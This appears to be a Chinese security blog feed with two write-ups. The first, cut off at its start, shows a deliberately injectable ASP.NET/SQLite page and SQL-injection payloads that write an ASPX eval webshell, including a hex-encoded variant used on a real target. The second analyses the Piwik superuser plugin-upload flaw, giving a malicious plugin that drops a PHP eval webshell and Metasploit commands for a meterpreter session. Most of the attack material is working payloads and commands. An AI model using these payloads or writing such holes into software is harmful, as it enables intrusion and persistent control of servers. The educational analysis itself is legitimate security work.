class="attr">OnClick</span>=<span class="string">"btn_Click"</span> <span class="attr">Text</span>=<span class="string">"查询"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Default.aspx.cs是代码的实现，代码如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Web;</span><br><span class="line">using System.Web.UI;</span><br><span class="line">using System.Web.UI.WebControls;</span><br><span class="line">using System.Data.SQLite; </span><br><span class="line"></span><br><span class="line">public partial class _Default : System.Web.UI.Page</span><br><span class="line">&#123;</span><br><span class="line">    protected void Page_Load(object sender, EventArgs e)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!System.IO.File.Exists(Server.MapPath(<span class="string">"~"</span>) + <span class="string">"/UserData.dbx"</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            SQLiteConnection.ClearAllPools();</span><br><span class="line">            SQLiteConnection.CreateFile(Server.MapPath(<span class="string">"~"</span>) + <span class="string">"/UserData.dbx"</span>);</span><br><span class="line">            SQLiteConnection conn = new SQLiteConnection(<span class="string">"Data Source="</span> + Server.MapPath(<span class="string">"~"</span> + <span class="string">"/UserData.dbx"</span>));</span><br><span class="line">            conn.Open();</span><br><span class="line">            SQLiteCommand cmd = new SQLiteCommand();</span><br><span class="line">            cmd.CommandText = <span class="string">"create table Users (UserID int primary key,UserName varchar(100) not null,UserPassword varchar(100) not null)"</span>;</span><br><span class="line">            cmd.Connection = conn;</span><br><span class="line">            cmd.ExecuteNonQuery();</span><br><span class="line">            <span class="keyword">for</span> (int i = 0; i &lt; 100; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                cmd.CommandText = <span class="string">"insert into Users (UserID,UserName,UserPassword) values ("</span> + i + <span class="string">",'TestUser_"</span> + i + <span class="string">"','"</span> + DateTime.Now.ToString().Replace(<span class="string">" "</span>, <span class="string">"-"</span>).Replace(<span class="string">":"</span>, <span class="string">"-"</span>) + <span class="string">"')"</span>;</span><br><span class="line">                cmd.ExecuteNonQuery();</span><br><span class="line">            &#125;</span><br><span class="line">            conn.Clone();</span><br><span class="line">            conn.Dispose();</span><br><span class="line">            Response.Write(<span class="string">"初始化~~&lt;br /&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Response.Write(<span class="string">"加载成功~~&lt;br /&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected void btn_Click(object sender, EventArgs e)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (TextBox1.Text != <span class="string">""</span>)&#123;</span><br><span class="line">            SQLiteConnection.ClearAllPools();</span><br><span class="line">            //SQLiteConnection.CreateFile(Server.MapPath(<span class="string">"~"</span>) + <span class="string">"/UserData.dbx"</span>);</span><br><span class="line">            SQLiteConnection conn = new SQLiteConnection(<span class="string">"Data Source="</span> + Server.MapPath(<span class="string">"~"</span> + <span class="string">"/UserData.dbx"</span>));</span><br><span class="line">            conn.Open();</span><br><span class="line">            SQLiteCommand cmd = new SQLiteCommand();</span><br><span class="line">            cmd.CommandText = <span class="string">"select UserPassword from Users where UserName='"</span> + TextBox1.Text.Trim()+<span class="string">"'"</span>;</span><br><span class="line">            cmd.Connection = conn;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cmd.ExecuteScalar() != null)</span><br><span class="line">            &#123;</span><br><span class="line">                string tempUserName = cmd.ExecuteScalar().ToString();</span><br><span class="line">                Response.Write(<span class="string">"查询结果为:"</span> + tempUserName + <span class="string">"&lt;br /&gt;&lt;br /&gt;"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                Response.Write(<span class="string">"无此用户"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            Response.Write(<span class="string">"请输入查询内容~~&lt;br /&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后将项目部署即可，这就是一个存在注入的项目。接下来就是利用注入来获取WEBSHELL。</p>
<h4 id="2-SQL注入写WEBSHELL"><a href="#2-SQL注入写WEBSHELL" class="headerlink" title="2.SQL注入写WEBSHELL"></a>2.SQL注入写WEBSHELL</h4><p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/项目部署.jpg" alt="项目部署"></p>
<p>当输入<code>&#39;</code>时，项目报错，同时将web绝对路径暴露出来。</p>
<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/报错.jpg" alt="报错"></p>
<p>然后就根据上面SQLite创建ASPX格式的数据库的方式来写入一个WEBSHELL。</p>
<p>其语句为：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">';ATTACH DATABASE '</span>c:\\WebSite\\css.aspx<span class="string">' AS pwn ;create TABLE pwn.exp (dataz text) ; insert INTO pwn.exp (dataz) VALUES ('</span>&lt;%@ Page Language=<span class="string">"Jscript"</span>%&gt;&lt;%<span class="built_in">eval</span>(Request.Item[<span class="string">"pass"</span>],<span class="string">"unsafe"</span>);%&gt;<span class="string">'); --</span></span><br></pre></td></tr></table></figure>
<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/测试环境写shell.jpg" alt="测试环境写shell"></p>
<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/测试环境成功写入SHELL.jpg" alt="测试环境成功写入SHELL"></p>
<p>测试环境很顺利就通过SQL注入写入了WEBSHELL，但是在实际测试中并非如此顺利。接下来看看在实际应用中遇到的问题以及解决的方法。</p>
<h3 id="0x04-实际中应用中遇到的问题及解决方法"><a href="#0x04-实际中应用中遇到的问题及解决方法" class="headerlink" title="0x04 实际中应用中遇到的问题及解决方法"></a>0x04 实际中应用中遇到的问题及解决方法</h3><p>已知：该系统存在SQL注入，数据库为SQLite，通过报错发现web项目的绝对路径。后台存在弱口令，后台可以上传图片格式文件。</p>
<p>直接利用SQLite写aspx文件时，发现可以写入成功，但是SHELL没有执行。无法判断是shell代码未写入成功还是未执行成功。然后就先写个TXT查看shell代码是否可以写入成功。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">';ATTACH DATABASE '</span>d:\\********\\web\\24.txt<span class="string">' AS pwn ;create TABLE pwn.exp (dataz text) ; insert INTO pwn.exp (dataz) VALUES ('</span>&lt;%@ Page Language=<span class="string">"Jscript"</span>&gt;&lt;%<span class="built_in">eval</span>(Request.Item[<span class="string">"pass"</span>],<span class="string">"unsafe"</span>);%&gt;<span class="string">'); --</span></span><br></pre></td></tr></table></figure>
<p>然后直接访问根目录下的24.txt文件即可下载，下载后用SQLite数据库管理工具打开，这里用的是Navicat。</p>
<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/24txt.jpg" alt="24txt"></p>
<p>打开发现竟然是空的。然而将shell代码替换为字符串<code>test</code>时可以写入成功。那应该就是写入的SHELL中含有一些符号所致，这里尝试了转义都未能解决。</p>
<p>由于可以找到图片上传的入口，所以有这样一个思路：在本地生成一个格式为jpg的数据库文件，创建表并写入SHELL，然后上传到服务器；在网站上利用注入新建一个txt格式的数据库，创建表后将图片格式数据库的内容插入到txt格式数据库中。</p>
<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/生成图片格式马.jpg" alt="生成图片格式马"></p>
<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/恢复数据库1.jpg" alt="恢复数据库1"></p>
<p>提示数据库编码不一致，那就换另外一种方法。首先在web根目录生成一个jpg格式的数据库，创建表后下载；在本地打开后插入数据，之后上传到服务器；再在网站新建一个ASPX格式的数据库，创建表后将图片格式数据库的内容插入到ASPX格式数据库中。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">';ATTACH DATABASE '</span>d:\\********\\web\\fp.jpg<span class="string">' AS pwn;create TABLE pwn.exp(dataz text);--</span></span><br></pre></td></tr></table></figure>
<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/服务器生成图片数据库.jpg" alt="服务器生成图片数据库"></p>
<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/恢复数据库2.jpg" alt="恢复数据库2"></p>
<p>可以成功写入，但访问发现插入的ASPX代码被原样输出，SHELL未执行成功。然后来对比一下在web上生成和本地生成的文件有什么区别。</p>
<p>分别在本地和web上生成一个txt格式的数据库文件，新建表后插入<code>test</code>。然后对比其内容：</p>
<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/数据内容对比.jpg" alt="数据内容对比"></p>
<p>对比后发现网站生成的内容都多了一个空格。</p>
<p>有同事提议说用十六进制试试，然后将shell内容转换为十六进制后插入。然而在web上测试失败。</p>
<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/web十六进制写SHELL1.jpg" alt="web十六进制写SHELL1"></p>
<p>本地测试也失败。</p>
<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/本地十六进制写文件.jpg" alt="本地十六进制写文件"></p>
<p>经过搜索发现，SQLite中十六进制的写法为：<code>x&#39;....&#39;</code>，而不是<code>0x....</code>。</p>
<p>例如<code>&lt;%@ Page Language=&quot;Jscript&quot;&gt;&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</code>在SQLite中的十六进制表示为：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x<span class="string">'3c25402050616765204c616e67756167653d224a736372697074223e3c256576616c28526571756573742e4974656d5b2270617373225d2c22756e7361666522293b253e'</span></span><br></pre></td></tr></table></figure></p>
<p>成功写入shell</p>
<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/十六进制写shell.jpg" alt="十六进制写shell"></p>
<p>菜刀连接：</p>
<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/shell写入成功.jpg" alt="shell写入成功"></p>
<h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><p>通过以上的测试过程和实际利用，可以归纳两点：</p>
<p>1.SQLite可以创建任意格式的数据库文件，并且插入的代码可以根据文件格式来解析，这就造成了可以利用这种方式写WEBSHELL的原因。<br>2.SQLite中十六进制的写法为：<code>x&#39;....&#39;</code>，而不是<code>0x....</code>。</p>
<h3 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h3><p>[1]<a href="http://www.cnblogs.com/xiaozi/p/5760321.html" target="_blank" rel="noopener">http://www.cnblogs.com/xiaozi/p/5760321.html</a><br>[2]<a href="https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet" target="_blank" rel="noopener">https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet</a><br>[3]<a href="http://blog.csdn.net/mazhaojuan/article/details/7660657" target="_blank" rel="noopener">http://blog.csdn.net/mazhaojuan/article/details/7660657</a></p>
]]></content>
      
        <categories>
            
            <category> 渗透测试 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> WEBSHELL </tag>
            
            <tag> SQLite </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Piwik代码执行漏洞安全分析（附验证过程Getshell）]]></title>
      <url>/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/</url>
      <content type="html"><![CDATA[<h3 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h3><p><a href="https://piwik.org/" target="_blank" rel="noopener">Piwik</a>是一个PHP和MySQL的开放源代码的Web统计软件. 它给你一些关于你的网站的实用统计报告，比如网页浏览人数, 访问最多的页面, 搜索引擎关键词等等。</p>
<p>Piwik拥有众多不同功能的插件，你可以添加新的功能或是移除你不需要的功能，Piwik同样可以安装在你的服务器上面，数据就保存在你自己的服务器上面。你可以非常容易的插入统计图表到你的博客或是网站抑或是后台的控制面板中。安装完成后，你只需将一小段代码放到将要统计的网页中即可。</p>
<a id="more"></a>
<p>在17年2月份<a href="https://firefart.at/post/turning_piwik_superuser_creds_into_rce/" target="_blank" rel="noopener">FireFart</a>报告了一个Piwik超级用户获取远程代码执行的漏洞。该漏洞通过利用构造插件，然后利用超级用户上传并激活，在激活插件时会执行插件中的PayLoad，从而获取shell。本文将介绍一下漏洞原理、环境的搭建、PayLoad的构造以及漏洞的复现过程，如有不足，请多多指教。</p>
<h3 id="0x02-漏洞原理分析"><a href="#0x02-漏洞原理分析" class="headerlink" title="0x02 漏洞原理分析"></a>0x02 漏洞原理分析</h3><p>插件激活时请求的URL为：<br><a href="http://192.168.217.1/piwik-3.0.1/index.php?module=CorePluginsAdmin&amp;action=activate&amp;idSite=1&amp;period=day&amp;date=yesterday&amp;nonce=4fe9b3937078e06f3f24d45a53ee614c&amp;pluginName=ff" target="_blank" rel="noopener">http://192.168.217.1/piwik-3.0.1/index.php?module=CorePluginsAdmin&amp;action=activate&amp;idSite=1&amp;period=day&amp;date=yesterday&amp;nonce=4fe9b3937078e06f3f24d45a53ee614c&amp;pluginName=ff</a></p>
<p>代码定位到<code>piwik-3.0.1\plugins\CorePluginsAdmin\Controller.php</code>中的activate方法。</p>
<p>找到pluginManager调用的激活插件方法。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">activate</span><span class="params">($redirectAfter = true)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $pluginName = <span class="keyword">$this</span>-&gt;initPluginModification(<span class="keyword">static</span>::ACTIVATE_NONCE);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;dieIfPluginsAdminIsDisabled();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;pluginManager-&gt;activatePlugin($pluginName);<span class="comment">//激活插件</span></span><br><span class="line">        ....</span><br><span class="line">        <span class="comment">//省略部分代码</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p>
<p>然后往上翻，找到pluginManager变量。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> $pluginManager;</span><br><span class="line">....</span><br><span class="line"><span class="comment">//省略部分代码</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;pluginManager = Plugin\Manager::getInstance();</span><br><span class="line">.....</span><br></pre></td></tr></table></figure>
<p>定位到<code>piwik-3.0.1\core\Plugin\Manager.php</code>文件，找到其activatePlugin方法。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">activatePlugin</span><span class="params">($pluginName)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">		....</span><br><span class="line">        <span class="comment">//省略部分代码</span></span><br><span class="line">        <span class="comment">// Load plugin</span></span><br><span class="line">        $plugin = <span class="keyword">$this</span>-&gt;loadPlugin($pluginName);</span><br><span class="line">        <span class="keyword">if</span> ($plugin === <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">"The plugin '$pluginName' was found in the filesystem, but could not be loaded.'"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;installPluginIfNecessary($plugin);</span><br><span class="line">        $plugin-&gt;activate();</span><br><span class="line">		....</span><br><span class="line">        <span class="comment">//省略部分代码</span></span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p>loadPlugin是根据插件名字加载，最后生成一个类对象，可以直接调用其中的方法，其代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadPlugin</span><span class="params">($pluginName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;loadedPlugins[$pluginName])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;loadedPlugins[$pluginName];</span><br><span class="line">    &#125;</span><br><span class="line">    $newPlugin = <span class="keyword">$this</span>-&gt;makePluginClass($pluginName);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;addLoadedPlugin($pluginName, $newPlugin);</span><br><span class="line">    <span class="keyword">return</span> $newPlugin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>installPluginIfNecessary方法是判断该插件是否安装，如果没有安装的话，调用executePluginInstall方法来安装，executePluginInstall方法执行了插件中的install()方法，然后再执行activate()方法。</p>
<p>由此可知，当激活插件时，会加载插件，将其生成为类对象。然后判断是否安装插件，如果没有安装，调用插件中的install()方法，再调用activate()方法。<br>接下来就开始搭建环境具体来实现一下。</p>
<h3 id="0x03-环境的搭建"><a href="#0x03-环境的搭建" class="headerlink" title="0x03 环境的搭建"></a>0x03 环境的搭建</h3><h4 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h4><p>主机：Windows10 x64</p>
<p>WEB环境：采用的是phpStudy集成环境（PHP/5.5.30，MySQL/5.5.47，Apache/2.4.18 ）</p>
<p>程序版本：<a href="https://www.exploit-db.com/apps/cec6f1b03cc8ed4e62754919c5922d42-piwik-3.0.1.tar.gz" target="_blank" rel="noopener">3.0.1</a>(也可以在<a href="https://builds.piwik.org/" target="_blank" rel="noopener">https://builds.piwik.org/</a> 下载)</p>
<h4 id="2-composer工具的安装"><a href="#2-composer工具的安装" class="headerlink" title="2.composer工具的安装"></a>2.composer工具的安装</h4><p>下载地址：<a href="https://getcomposer.org/Composer-Setup.exe" target="_blank" rel="noopener">https://getcomposer.org/Composer-Setup.exe</a></p>
<p>下载后直接运行Composer-Setup.exe进行安装。</p>
<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/composer_setup_1.jpg" alt="composer安装"></p>
<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/composer_setup_2.jpg" alt="选择PHP.exe的位置"></p>
<p>然后根据提示，继续下一步即可。</p>
<blockquote>
<p>注意：安装时PHP应开启php_openssl扩展，不然会报错。</p>
</blockquote>
<h4 id="3-Piwik程序的部署"><a href="#3-Piwik程序的部署" class="headerlink" title="3.Piwik程序的部署"></a>3.Piwik程序的部署</h4><p>将下载下来的程序源码解压到phpStudy下的WWW目录。这里我项目名字为piwik-3.0.1。</p>
<p>在piwik-3.0.1目录下执行<code>composer install</code>命令来安装项目所依赖的代码库。</p>
<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/composer_setup_3.png" alt="依赖的代码库的安装"></p>
<p>安装后在项目的根目录会出现一个vendor文件夹。</p>
<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/vendor_files.jpg" alt="vendor目录下文件"></p>
<p>访问<a href="http://192.168.217.1/piwik-3.0.1/" target="_blank" rel="noopener">http://192.168.217.1/piwik-3.0.1/</a> 开始进行安装</p>
<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/Piwik_setup.jpg" alt="Piwik安装"></p>
<p>点击Next进行下一步安装。</p>
<p>数据库设置</p>
<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/Piwik_Database_setup.png" alt="数据库设置"></p>
<p>超级用户设置</p>
<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/Piwik_superUser_set.jpg" alt="超级用户设置"></p>
<p>之后进行系统的设置，这里就省略过程了。</p>
<p>安装完成后访问<a href="http://192.168.217.1/piwik-3.0.1/" target="_blank" rel="noopener">http://192.168.217.1/piwik-3.0.1/</a> 进行登陆。</p>
<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/piwik_login.jpg" alt="piwik登陆人口"></p>
<blockquote>
<p>用户名/密码为第五步中设置的超级用户。</p>
</blockquote>
<h3 id="0x04-验证过程"><a href="#0x04-验证过程" class="headerlink" title="0x04 验证过程"></a>0x04 验证过程</h3><h4 id="1-漏洞产生原因及PayLoad的编写"><a href="#1-漏洞产生原因及PayLoad的编写" class="headerlink" title="1.漏洞产生原因及PayLoad的编写"></a>1.漏洞产生原因及PayLoad的编写</h4><p>Piwik默认在3.0.3之前允许自定义插件上传，当插件被激活时，install方法会被调用，会执行其中编写的PayLoad。</p>
<p>如果我们编写一个名字叫做pwned的插件，其文件结构为：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwned/</span><br><span class="line">pwned/pwned.php</span><br><span class="line">pwned/plugin.json</span><br></pre></td></tr></table></figure></p>
<p>文件内容：</p>
<p>pwned.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Piwik</span>\<span class="title">Plugins</span>\<span class="title">pwned</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwned</span> <span class="keyword">extends</span> \<span class="title">Piwik</span>\<span class="title">Plugin</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">install</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="comment">//要执行的Payload</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>plugin.json</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  "name": "pwned",//插件名称</span><br><span class="line">  "description": "DESCRIPTION",//插件描述</span><br><span class="line">  "version": "1.0",//插件版本</span><br><span class="line">  "theme": false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后将其压缩为zip格式的压缩文件。当插件上传后并被激活时，就会执行pwned.php中的payload。</p>
<h4 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h4><p><strong>PayLoad的准备</strong></p>
<p>修改上述的pwned.php代码，在install方法中添加写shell的代码。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Piwik</span>\<span class="title">Plugins</span>\<span class="title">pwned</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwned</span> <span class="keyword">extends</span> \<span class="title">Piwik</span>\<span class="title">Plugin</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">install</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    $myfile = fopen(<span class="string">"shell.php"</span>, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">	$content = <span class="string">"&lt;?eval(\$_POST['pass']);?&gt;"</span>;</span><br><span class="line">	fwrite($myfile, $content);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>plugin.json不用做过多的修改。</p>
<p>然后压缩为pwned.zip。</p>
<p><strong>PayLoad的利用</strong></p>
<p>利用创建的超级用户登陆，登陆后点击Administration或者访问<a href="http://192.168.217.1/piwik-3.0.1/index.php?module=CoreAdminHome&amp;action=home&amp;idSite=1&amp;period=day&amp;date=yesterday" target="_blank" rel="noopener">http://192.168.217.1/piwik-3.0.1/index.php?module=CoreAdminHome&amp;action=home&amp;idSite=1&amp;period=day&amp;date=yesterday</a></p>
<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/piwik_plugins.jpg" alt="piwik 插件人口"></p>
<p>安装新插件</p>
<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/piwik_plugins_install.jpg" alt="piwik 安装新插件人口"></p>
<p>上传新插件</p>
<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/piwik_plugins_upload.jpg" alt="piwik 插件市场"></p>
<p>插件上传</p>
<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/piwik_plugins_uploading.jpg" alt="piwik 插件上传"></p>
<p>插件上传成功</p>
<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/piwik_plugins_uploadsuccess.jpg" alt="piwik 插件上传成功"></p>
<p>然后点击激活插件按钮</p>
<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/plugin_activated.jpg" alt="插件激活"></p>
<p>插件激活后，会在根目录生成一个shell.php</p>
<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/shell.jpg" alt="shell"></p>
<h4 id="3-利用Metasploit生成meterpreter会话"><a href="#3-利用Metasploit生成meterpreter会话" class="headerlink" title="3.利用Metasploit生成meterpreter会话"></a>3.利用Metasploit生成meterpreter会话</h4><p>上面的结果是写入了WEBSHELL，也可以采用piwik_superuser_plugin_upload直接生成一个meterpreter会话。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/unix/webapp/piwik_superuser_plugin_upload </span><br><span class="line">msf exploit(piwik_superuser_plugin_upload) &gt; </span><br><span class="line">msf exploit(piwik_superuser_plugin_upload) &gt; <span class="built_in">set</span> PASSWORD admin888</span><br><span class="line">PASSWORD =&gt; admin888</span><br><span class="line">msf exploit(piwik_superuser_plugin_upload) &gt; <span class="built_in">set</span> RHOST 192.168.217.1</span><br><span class="line">RHOST =&gt; 192.168.217.1</span><br><span class="line">msf exploit(piwik_superuser_plugin_upload) &gt; <span class="built_in">set</span> TARGETURI /piwik-3.0.1/</span><br><span class="line">TARGETURI =&gt; /piwik-3.0.1/</span><br><span class="line">msf exploit(piwik_superuser_plugin_upload) &gt; <span class="built_in">set</span> USERNAME admin</span><br><span class="line">USERNAME =&gt; admin</span><br><span class="line">msf exploit(piwik_superuser_plugin_upload) &gt; exploit</span><br></pre></td></tr></table></figure>
